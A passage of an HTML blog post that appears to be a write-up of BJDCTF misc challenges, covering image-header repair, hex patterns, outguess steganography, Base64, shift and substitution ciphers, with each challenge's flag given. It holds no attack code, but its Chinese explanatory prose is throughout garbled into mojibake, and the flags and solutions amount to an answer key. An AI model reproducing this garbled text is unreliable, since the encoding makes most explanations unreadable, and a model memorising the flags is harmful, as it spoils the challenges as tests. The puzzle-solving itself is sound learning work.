é‡Œï¼Œç”±å¤´éƒ¨çš„ <code>IHDR</code> å’Œ å°¾éƒ¨çš„ <code>IEND</code> çŸ¥é“è¿™æ˜¯ä¸€å¼  png å›¾ç‰‡ã€‚äºæ˜¯æ‰¾ä¸€å¼ æ­£å¸¸çš„ pngï¼Œå¤åˆ¶ secret ä¸¢å¤±çš„éƒ¨åˆ†ï¼Œå³ <code>89 50 4E 47 0D 0A 1A 0A 00 00 00 00 0D</code> è¿™ä¸€éƒ¨åˆ†ï¼Œå°†å…¶ç›¸åº”å¾—è¡¥å……åˆ° secret çš„å¤´éƒ¨ï¼Œä¿å­˜åå³å¯æ­£å¸¸æ‰“å¼€ secret å›¾ç‰‡ã€‚å¾—åˆ°ä¸€ä¸² hex <code>42 4A 44 7B 79 31 6E 67 7A 75 69 73 68 75 61 69 7D</code> å°†å…¶è¿›è¡Œç¼–ç è½¬æ¢åå¯å¾—flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;y1ngzuishuai&#125;</span><br></pre></td></tr></table></figure><h3 id="Imagin-å¼€åœºæ›²"><a href="#Imagin-å¼€åœºæ›²" class="headerlink" title="Imagin - å¼€åœºæ›²"></a>Imagin - å¼€åœºæ›²</h3><p>è¿™é¢˜é¦–å…ˆä»å¼€å§‹çš„ç”»é¢ä¸­å¾—çŸ¥ Mikutapï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŒ‰é”®å¬éŸ³çš„è¿‡ç¨‹ï¼Œå°†æ‰€å¬åˆ°çš„éŸ³å’ŒæŒ‰é”®ä¸€ä¸€å¯¹åº”ã€‚ç»“åˆç»™å‡ºçš„ hint å¾—çŸ¥æ•°å­—çš„èŒƒå›´ï¼Œç„¶åæ…¢æ…¢å¬å‡º flagã€‚ï¼ˆçœŸå¥½ç©ï¼‰</p><p>é™„ä¸Šæˆ‘å¬å‡ºæ¥çš„æŒ‰é”®é¡ºåº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD BJD MIKU TAP MIKU TAP 331 331 3 331 331 3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;MIKUTAP3313313&#125;</span><br></pre></td></tr></table></figure><h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real EasyBaBa"></a>Real EasyBaBa</h3><p>æ‹¿åˆ°æ˜¾ç¤ºä¸æ­£å¸¸çš„å›¾ç‰‡ä¹‹åï¼Œè·‘äº†ä¸€ä¸‹ binwalkï¼Œå‘ç°ä¾æ—§æ˜¯æ™®é€šå›¾ç‰‡ã€‚äºæ˜¯æ‰“å¼€ 010editorï¼Œæœ‰äº†å‰é¢å°å§å§é‚£é¢˜çš„ç»éªŒï¼Œå°±æƒ³åˆ° flag åº”è¯¥æ˜¯è—åœ¨æ–‡ä»¶æœ¬èº«çš„å†…å®¹é‡Œã€‚æœç„¶åœ¨æ‰“å¼€ä¹‹åå‘ç°æœ‰ä¸€ä¸ªåŒºæ®µå¾ˆå¥‡æ€ªï¼Œå®Œå…¨ç”± <code>FF 00</code> è¿™ä¸¤ä¸ª hex äº¤æ›¿ç»„æˆã€‚ä¸€å¼€å§‹æ²¡çœ‹å‡ºä»€ä¹ˆï¼Œç›´åˆ°æˆ‘å°è¯•å»è¯»å®ƒä»¬çš„è½®å»“ï¼Œå°±å‘ç°äº†ä¸€äº›ä¸œè¥¿ã€‚ï¼ˆä¸‹é¢æ˜¯é‚£ä¸ªåŒºæ®µ å¾ˆæƒ³æ‰¾ä¸ªé«˜äº®æ¥ç€ ä½†æ˜¯è¿™æ ·ä¹Ÿå·®ä¸å¤šèƒ½çœ‹å‡ºæ¥ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FF FF FF 00 FF FF FF FF 00 FF FF 00 00 00 FF FF</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF FF 00 00 00 00 FF 00 00 FF 00 FF 00 FF 00 00</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF 00 FF 00 FF 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 00 FF FF 00 00 00 FF FF</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 FF FF FF 00 FF FF 00 00</span><br><span class="line">FF 00 00 00 00 00 FF 00 00 00 FF 00 00 FF 00 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 00 FF 00 00</span><br><span class="line">00 00 FF 00 00 00 FF 00 FF 00 00 00 00 FF 00 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 FF FF FF 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF 00 FF 00 FF FF FF 00 FF FF FF 00</span><br><span class="line">FF 00 00 00 FF 00 FF 00 FF 00 FF 00 00 00 FF 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 FF FF FF 00 00 00 FF 00</span><br><span class="line">00 00 FF 00 00 00 FF 00 00 00 FF 00 00 00 FF 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 00 00 FF 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 00 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 FF 00 00 FF FF 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 FF FF 00 63 DA E9 3C 36 B1 AA 93 59</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;572154976&#125;</span><br></pre></td></tr></table></figure><h3 id="åœ£ç«æ˜­æ˜­"><a href="#åœ£ç«æ˜­æ˜­" class="headerlink" title="åœ£ç«æ˜­æ˜­"></a>åœ£ç«æ˜­æ˜­</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">outguess</span></p><p>è§£å‹ zip ä¹‹åå¾—åˆ°ä¸€å¼ çŒ«çŒ«çš„å›¾ï¼ŒæŸ¥çœ‹å›¾ç‰‡å±æ€§ï¼Œæœ‰ä¸€æ®µå¯†æ–‡ã€‚ä½¿ç”¨ <a href="http://hi.pcmoe.net/buddha.html">æ–°çº¦ä½›è®ºç¦…</a> è¿™ä¸ªç«™ç‚¹çš„è§£å¯†å·¥å…·è§£å¯†ä¹‹åå¯ä»¥å¾—åˆ° key <code>gemlovecom</code>ï¼Œæ ¹æ® hint ä¿®è®¢ä¸º <code>gemlove</code>ã€‚</p><p>å†æ ¹æ®é¢˜ç›®æç¤ºçš„ guessï¼Œä¸€ç•ªæœç´¢ä¹‹åæ‰¾åˆ°äº† GitHub ä¸Šçš„ outguess å·¥å…·ã€‚Cloneã€ç¼–è¯‘å¹¶å®‰è£…ä¹‹åæ ¹æ®ç”¨æ³•å†™å‡ºä¸‹åˆ—æŒ‡ä»¤ä»å›¾ç‰‡ä¸­åˆ†ç¦»åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;gemlove&quot; -r sheng_huo_zhao_zhao.jpg hidden</span><br></pre></td></tr></table></figure><p>ä» hidden ä¸­å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;</span><br></pre></td></tr></table></figure><h3 id="Easy-Baba"><a href="#Easy-Baba" class="headerlink" title="Easy Baba"></a>Easy Baba</h3><p>ä¸‹è½½åˆ°å›¾ç‰‡ä¹‹åå‘ç°æœ‰ 19Mï¼Œæœæ–­è·‘äº†ä¸€æ³¢ binwalkï¼Œå‘ç°ç»“æœå¾ˆå¥‡æ€ªï¼Œä¸­é—´å¥½åƒæ’å…¥äº†ä»€ä¹ˆã€‚äºæ˜¯è·‘äº†ä¸€æ³¢ foremostï¼Œå¾—åˆ°äº†ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªå‹ç¼©åŒ…ã€‚å‹ç¼©åŒ…è§£å‹åæœ‰ä¸€å¼  jpg å« <strong>é‡Œé¢éƒ½æ˜¯å‡ºé¢˜äºº</strong>ã€‚ä½†æ˜¯è¿™å¼ å›¾ç‰‡æ— æ³•æ‰“å¼€ï¼Œäºæ˜¯æ”¾è¿› 010editor ä¸­ï¼Œç”±æ–‡ä»¶å¤´éƒ¨çš„ <code>52 49 46 46 1C 7D 7D 02 41 56 49 20</code> è¿™ä¸€æ®µå¯çŸ¥è¿™æ˜¯ä¸€ä¸ª avi æ ¼å¼çš„è§†é¢‘æ–‡ä»¶ï¼Œäºæ˜¯ä¿®æ­£æ‹“å±•åã€‚æ ¹æ®é¢˜ç›® hintï¼Œå°†è§†é¢‘æ”¾è¿› Pr ä¸­é€å¸§æ’­æ”¾ï¼Œåœ¨å„å‡ºé¢˜äººçš„å›¾ç‰‡ä¸Šå¾—åˆ°äº†ä¸‰ä¸ªäºŒç»´ç ï¼ˆå…¶å®åº”è¯¥è¿˜æœ‰ä¸€ä¸ªï¼Ÿä½†æ˜¯æˆ‘å¾—åˆ°è¿™ä¸‰ä¸ªä¹‹åçŒœå‡ºæ¥äº†ï¼‰ã€‚å°†ä¸‰ä¸ªäºŒç»´ç æˆªå›¾ä¹‹åæ”¾è¿› Ps ä¸­ï¼Œè°ƒæ•´ä¸€ä¸‹è‰²é˜¶ç„¶ååç›¸ï¼Œå°±èƒ½å¾—åˆ°èƒ½å¤Ÿè½»æ˜“æ‰«å‡ºæ¥çš„äºŒç»´ç ã€‚é€ä¸ªæ‰«æä¹‹åå¾—åˆ°ä¸‰æ®µ hexã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6167696E5F6C</span><br><span class="line">6F76655F59</span><br><span class="line">316E677D</span><br></pre></td></tr></table></figure><p>è½¬æ¢ç¼–ç ä¹‹åå¾—åˆ°äº†ä¸€éƒ¨åˆ† flag  <code>agin_love_Y1ng&#125;</code>  æ ¹æ®é¢˜ç›®çš„æç¤ºå¾—çŸ¥é¢˜ç›®ä¸­çš„ä¸»è§’åº”è¯¥æ˜¯ imagin å¸ˆå‚…ï¼Œäºæ˜¯è¡¥å…¨ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;imagin_love_Y1ng&#125;</span><br></pre></td></tr></table></figure><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>ç®€å•çš„ Base64 ç¼–ç è½¬æ¢ï¼Œå°†é¢˜ç›®æ‰€ç»™å­—ç¬¦ä¸²è§£ç å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;W3lc0me_T0_BJDCTF&#125;</span><br></pre></td></tr></table></figure><h3 id="ç‡•è¨€ç‡•è¯­"><a href="#ç‡•è¨€ç‡•è¯­" class="headerlink" title="ç‡•è¨€ç‡•è¯­"></a>ç‡•è¨€ç‡•è¯­</h3><p>æ‹¿åˆ°é¢˜ç›®çš„å­—ç¬¦ä¸²ä¹‹åè§‚å¯Ÿå¯çŸ¥è¿™æ˜¯ä¸€æ®µ hexï¼Œç¼–ç è½¬æ¢ä¹‹åå¾—åˆ°æ˜æ–‡ <code>yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </code>ã€‚<code>ZJQ BJD</code> è¿™äºŒè€…çš„å¯¹åº”å…³ç³»åº”è¯¥ç®—æ˜¯æç¤ºï¼Œäºæ˜¯æ‰‹ç®—äº†ä¸€ä¸‹ï¼Œå¾ˆå®¹æ˜“å‘ç°ï¼ŒZ å¾€å‰ç§»åŠ¨ 24 ä¸ªä½ç½®å¾—åˆ° Bï¼Œè€Œ J çš„ä½ç½®æ²¡ç§»åŠ¨ï¼ŒQ å‘å‰ç§»åŠ¨ 13 ä¸ªä½ç½®å¾—åˆ° Dã€‚è€Œ 24ã€0ã€13 çš„ä½ç½®ç¼–å·åˆšå¥½å¯¹åº”å½“ A ä¸º 0 æ—¶çš„å­—æ¯ç¼–å·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">y:24</span><br><span class="line">a:0</span><br><span class="line">n:13</span><br><span class="line">z:25</span><br><span class="line">i:8</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šè¿°çš„ä½ç½®å…³ç³»ï¼Œå¾ªç¯ä½¿ç”¨ <code>yanzi</code> ä½œä¸ºè§£å¯†çš„è¦ç´ ï¼Œå°†å„ä¸ªå­—ç¬¦ä¾æ¬¡å‰ç§»å¯ä»¥å¾—åˆ° flagã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ç§»åŠ¨çš„æ—¶å€™è¦å¾ªç¯ï¼Œå³ Z çš„åé¢åˆæ˜¯ Aã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;yanzi_jiushige_shabi&#125;</span><br></pre></td></tr></table></figure><h3 id="è€æ–‡ç›²äº†"><a href="#è€æ–‡ç›²äº†" class="headerlink" title="è€æ–‡ç›²äº†"></a>è€æ–‡ç›²äº†</h3><p>è¿™é¢˜çš„é™„ä»¶æ˜¯ rarï¼Œè¡¥å…¨æ‹“å±•åä¹‹åè§£å‹å¾—åˆ° old_illiterate.txtã€‚æ‰“å¼€ä¹‹åå¾—åˆ°éš¾æ‡‚çš„ä¸­æ–‡ï¼Œäºæ˜¯æ ¹æ®é¢˜ç›®çš„ hint å»æŸ¥äº†å¯¹åº”çš„æ‹¼éŸ³ï¼Œå¾—åˆ° <code>bÃ¬ jÃ­ dÃ¬ dÃ  kuÃ² hÃ o zhÃ¨ jiÃ¹ shÃ¬ fÇ” lÃ i gÄ“ zhÃ­ jiÄ“ jiÄo lÃ¨ bÄ dÃ  kuÃ² hÃ o </code>ã€‚æ ¹æ®è¿™ä¸ªæç¤ºæŠŠè¿™æ®µä¸­æ–‡æå¤´å»å°¾ç„¶ååŒ…ä¸Š flag çš„å›ºå®šæ ¼å¼å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;æ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µ&#125;</span><br></pre></td></tr></table></figure><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><p>æ‹¿åˆ°çŒ«çŒ«å›¾ç‰‡ä¹‹åï¼Œå…«ä¸ªçŒ«çŒ«ä¸€æ’ï¼Œå¯ä»¥æƒ³åˆ°æ˜¯äºŒè¿›åˆ¶ç¼–ç ã€‚äºæ˜¯æŠŠåƒé¥­å›¢çš„çŒ«çŒ«æ ‡è®°ä½œ 0ï¼ŒæŠŠåƒé¸¡è…¿çš„çŒ«çŒ«æ ‡è®°ä½œ 1ï¼Œå¾—åˆ°å¦‚ä¸‹ç¼–ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">01000010</span><br><span class="line">01001010</span><br><span class="line">01000100</span><br><span class="line">01111011</span><br><span class="line">01001101</span><br><span class="line">00100001</span><br><span class="line">01100001</span><br><span class="line">00110000</span><br><span class="line">01111110</span><br><span class="line">01111101</span><br></pre></td></tr></table></figure><p>è½¬æ¢ç¼–ç åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure><h3 id="çµèƒ½ç²¾é€š"><a href="#çµèƒ½ç²¾é€š" class="headerlink" title="çµèƒ½ç²¾é€š"></a>çµèƒ½ç²¾é€š</h3><p>å…¶å®ä¸€å¼€å§‹æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œä½†æ˜¯åœ¨è¯¸å¤šæç¤ºä¸‹ï¼Œæ ¹æ®æç¤ºæ‰¾åˆ°å¦‚ä¸‹è§£å¯†å›¾ç‰‡ã€‚</p><div align=center><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/dbefc985-0bb5-40b5-9154-aad1b7b76aeb/1613214347879978/9361855c1fdcb2776f7b9d2f64695fa8b1db09be.jpg" alt="Templar Cipher"></p></div>å¯¹åº”è§£å¯†ä¹‹åï¼Œå¯ä»¥å¾—åˆ° flagã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;IMKNIGHTSTEMPLAR&#125;</span><br></pre></td></tr></table></figure><h3 id="Y1nglish"><a href="#Y1nglish" class="headerlink" title="Y1nglish"></a>Y1nglish</h3><p>è¿™é¢˜æˆ‘å¯å–œæ¬¢äº†ï¼Œä¸‹é¢æˆ‘æ¥åˆ†æä¸€æ³¢ã€‚</p><p>é¦–å…ˆæ ¹æ®æç¤ºå¾—çŸ¥è¿™æ˜¯ä¸€ç¯‡å®Œå…¨å¯è¯»çš„è‹±æ–‡æ–‡ç« ï¼Œæ‰€ä»¥å¤§å°å†™ä¸åšç‰¹åˆ«åŒºåˆ†ã€‚</p><p>å†è€…ï¼Œæ ¹æ®å‰é¢é¢˜ç›®çš„ç»éªŒï¼ŒMIH åº”è¯¥å¯¹åº” BJDï¼Œå› æ­¤å¾—åˆ° M =&gt; Bã€I =&gt; Jã€H =&gt; Dã€‚</p><p><code>Izcztkok</code> è¿™ä¸ªè¯åœ¨å¥å­ä¸­é¦–å­—æ¯å¤§å†™ï¼Œå› æ­¤å®ƒæ˜¯ä¸€ä¸ªåè¯ï¼Œè€Œ z åœ¨åè¯å‰å•ç‹¬å‡ºç°ï¼ŒI å¯¹åº”çš„ J æ˜¯è¾…éŸ³éŸ³ç´ çš„å­—æ¯ï¼Œå› æ­¤ï¼Œåè¯å‰çš„ä¸å®šå† è¯åº”è¯¥æ˜¯ aï¼Œå› æ­¤ï¼ŒZ =&gt; Aã€‚</p><p>Q å­—æ¯åœ¨å•ç‹¬å‡ºç°çš„æ—¶å€™ä»æ¥æ²¡æœ‰å°å†™è¿‡ï¼Œä¸”å¤šä½äºå¥é¦–ï¼Œå› æ­¤åˆ¤å®šå…¶æ˜¯ä¸»è¯­ Iï¼Œå› æ­¤ Q =&gt; Iã€‚</p><p><code>zd</code> å‡ºç°åœ¨äº†å† è¯å‰ï¼Œç”± a å¼€å¤´çš„äºŒå­—æ¯å¸¸ç”¨è¯æœ‰ä¸¤ä¸ªï¼Œas å’Œ atï¼ˆå› ä¸ºæ²¡æœ‰ <code>Q zd</code> çš„ç»“æ„æ’é™¤ am è¿™ç§å¯èƒ½ï¼‰ã€‚ä½†æ˜¯è§‚å¯Ÿåˆ° <code>pk qo</code> éƒ¨åˆ†çš„åŠå¥ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œä»å¥å’Œæ™®é€šå¥ï¼Œä½†æ˜¯å› ä¸ºé™¤äº† as æ²¡æœ‰å…¶ä»–çš„äºŒå­—æ¯å¼•å¯¼è¯ï¼ˆp ä¹Ÿä¸å¯èƒ½æ˜¯ a)ï¼Œæ‰€ä»¥æŒ‰æ™®é€šå¥å¤„ç†ã€‚å› æ­¤ï¼Œ <code>pk</code> åº”è¯¥æ˜¯ä¸€ä¸ªä¸»è¯­ï¼Œè€Œ <code>qo</code> ä½œä¸º i å¼€å¤´çš„äºŒå­—æ¯è°“è¯­ï¼Œå°±æ˜¯ is äº†ï¼Œå› æ­¤ï¼ŒO =&gt; Sã€‚æ‰€ä»¥ <code>zd</code> ä¸å¯èƒ½æ˜¯ asï¼Œå› æ­¤ D =&gt; Tã€‚</p><p><code>ds</code>ï¼Œä»¥ t å­—æ¯å¼€å¤´çš„äºŒå­—æ¯å¸¸ç”¨å•è¯åªæœ‰ toï¼Œå› æ­¤ S =&gt; Oã€‚</p><p><code>qt</code>ï¼Œæ’é™¤äº† is, it è¿™äº›äºŒå­—æ¯å•è¯ï¼Œå‰©ä¸‹çš„ä»¥ i å¼€å¤´çš„å¸¸ç”¨è¯å°±å‰©ä¸‹ in äº†ã€‚å› æ­¤ T =&gt; Nã€‚</p><p>ç”±å‰é¢çš„æ¨æ–­å·²çŸ¥ <code>pk</code> æ˜¯ä¸ªä»£è¯ï¼Œæ‰€ä»¥ <code>pk nzo</code> ä¸­çš„ <code>nzo</code> ä¸€å®šæ˜¯ä¸ªè°“è¯­ï¼Œç»“åˆä¸Šè¿°çš„ç»“æœï¼Œå¯å¾—è¿™ä¸ªå•è¯æ˜¯ wasã€‚æ‰€ä»¥ N =&gt; Wã€‚</p><p><code>med</code> åé¢å‡ºç°äº†ä»£è¯ <code>pk</code> ä¸”å‡ºç°åœ¨æ–­å¥å¤„ï¼Œå› æ­¤ <code>med</code> æ˜¯ä¸ªè¿è¯ï¼Œç»“åˆä¸Šè¿°å¯å¾— <code>med</code> æ˜¯ butï¼Œå› æ­¤ E =&gt; Uã€‚</p><p>èƒ½å¤Ÿæ„æˆ <code>sef</code> è¿™ä¸ªç»“æ„çš„å•è¯å¹¶ä¸å¤šï¼Œè§£å‡ºäº†å‰ä¸¤ä¸ªå­—æ¯ï¼Œåªæœ‰ our, out è¿™ä¸¤ç§å¯èƒ½ï¼Œè€Œ D =&gt; Tï¼Œå› æ­¤ <code>sef</code> æå¤§å¯èƒ½æ˜¯ ourï¼Œå› æ­¤ F =&gt; Rã€‚</p><p>å› ä¸º <code>qo</code> æ˜¯ isï¼Œ<code>zth</code> æ˜¯ andï¼Œæ‰€ä»¥ï¼Œæ¨æµ‹ <code>usf</code> æ˜¯ä¸ªä»‹è¯ï¼Œä»¥ or ç»“å°¾çš„ä¸‰å­—æ¯ä»‹è¯ï¼Œæå¤§å¯èƒ½æ˜¯ forã€‚å› æ­¤ U =&gt; Fã€‚</p><p><code>vssh</code> å‡ºç°åœ¨äº†å† è¯åï¼Œä¸”å…¶åè¿˜æœ‰ä¸€ä¸ªè¯ï¼Œç´§æ¥ç€æ˜¯æ–­å¥ï¼Œå› æ­¤å®ƒå¯èƒ½æ˜¯ä¸ªå½¢å®¹è¯ï¼Œè€Œä»¥ _ood ç»“å°¾çš„å½¢å®¹è¯ï¼Œæå¤§å¯èƒ½æ˜¯ goodï¼Œå› æ­¤ï¼ŒV =&gt; Gã€‚</p><p><code>ufsl</code> è¿™ä¸ªè¯å‡ºç°åœ¨äº†ä¸¤ä¸ªåè¯ä¸­é—´ï¼Œä¸”è§£å‡ºå‡ ä¸ªå­—æ¯ä¸º fro_ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ° L =&gt; Mã€‚</p><p><code>vkdo</code> å‡ºç°åœ¨ä»£è¯ <code>Pk</code> åï¼Œå› æ­¤è€ƒè™‘å®ƒæ˜¯ä¸ªè°“è¯­åŠ¨è¯ï¼Œç»“åˆè§£å‡ºæ¥çš„å‡ ä¸ªå­—æ¯ï¼Œå®¹æ˜“æ‹¼åˆå‡º getsï¼Œå› æ­¤ K =&gt; Eã€‚å› æ­¤ï¼Œ<code>Pk</code> ç¬¬ä¸‰äººç§°ä»£è¯å¾—åˆ°éªŒè¯ï¼Œ<code>Pk</code> æ˜¯ Heï¼Œå› æ­¤ï¼ŒP =&gt; Hã€‚</p><p><code>mzoqa</code> ä¸­æ‹¼å‡ºå¤§éƒ¨åˆ†å­—æ¯ä¹‹åå®¹æ˜“å¾—å‡º A =&gt; Cã€‚</p><p><code>Qu wse</code> ä¸­çš„ Qu æ‹¼å‡ºä¸º Ifï¼Œåé¢çš„ <code>zfk</code> æ‹¼å‡ºä¸º areï¼Œæ‰€ä»¥å¥å­ç¼ºå°‘ä¸»è¯­ï¼Œæ¨æµ‹ä¸ºä»£è¯ï¼Œä»¥ _ou ç»“å°¾ï¼Œå› æ­¤å¾—å‡º <code>wse</code> æ˜¯ youï¼Œå› æ­¤ï¼ŒW =&gt; Yã€‚</p><p><code>qo lzqtbw usf</code> æ‹¼å‡º is main_y forï¼Œå®¹æ˜“å¾—å‡º B =&gt; Lã€‚</p><p><code>dwcko</code> æ‹¼å‡º ty_esï¼Œå®¹æ˜“å¾—å‡º C =&gt; Pã€‚</p><p>è¿›è¡Œåˆ°è¿™é‡Œï¼Œç­›é€‰ä¸€ä¸‹æ²¡æœ‰è¢«åŒ¹é…çš„å­—ç¬¦ï¼Œè¿˜å‰©ä¸‹ KQVXZ äº”ä¸ªå­—ç¬¦ã€‚</p><p><code>uqjk</code> æ‹¼å‡º fi_eï¼Œä»ä¸Šé¢é€‰ä¸€ä¸ªï¼Œæ‹¼å‡º fiveï¼Œå› æ­¤ï¼ŒJ =&gt; Vã€‚</p><p>å‰©ä¸‹å‡ ä¸ªå­—æ¯åœ¨æ–‡ç« ä¸­æ²¡æœ‰å‡ºç°ï¼Œå…ˆå¯¹ç…§ç€æŠŠæ•´ç¯‡æ–‡ç« è§£å¯†å†æƒ³åŠæ³•ã€‚ï¼ˆä¸‹é™„è§£å¯†æ–‡ç« [é”™è¯¯å·²æ›´æ­£]ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in network security, welcome to participate. Let me tell you a story.</span><br><span class="line">I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn&#39;t a Japanese name but he is really a Japanese. Harry worked in a lawyer&#39;s office years ago, but he is now working at a bank. He gets a good salary, but he always borrows money from his friends and never pays it back. Harry saw me and came and sat at the same table. He has never borrowed money from me. While he was eating, I asked him to lend me &amp;2. To my surprise, he gave me the money immediately. &#39;I have never borrrowed any money from you,&#39; Harry said,&#39;so now you can pay for my dinner!&#39; Now i will give you what you want.BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure><p>æ›´æ­£é”™è¯¯æ—¶ï¼Œæ ¹æ®æ–‡æ„å°† wory æ”¹ä½œ workï¼Œå› æ­¤ Y =&gt; Kã€‚</p><p>flag ä¸­çš„ geqc è§£å¯†ä½œ quip æ¯”è¾ƒåˆç†ï¼ˆå–„ç”¨æœç´¢å¼•æ“ï¼Œquipqiup - cryptoquip and cryptogram solverï¼‰å› æ­¤ï¼ŒG =&gt; Qã€‚</p><p>è‡³æ­¤ï¼Œæ–‡ç« å’Œ flag éƒ½å·²ç»è§£å¯†å®Œæ¯•ï¼Œä¸‹é™„å¯¹ç…§è¡¨ã€‚ï¼ˆå…¶ä¸­ Rã€X å› ä¸ºæ²¡æœ‰å‡ºç°ï¼Œæ— æ³•è§£å‡ºï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">CLPTURQDJVEMBWSHI ONFGY KA</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure><h3 id="SchroÌˆdinger"><a href="#SchroÌˆdinger" class="headerlink" title="SchroÌˆdinger"></a>SchroÌˆdinger</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 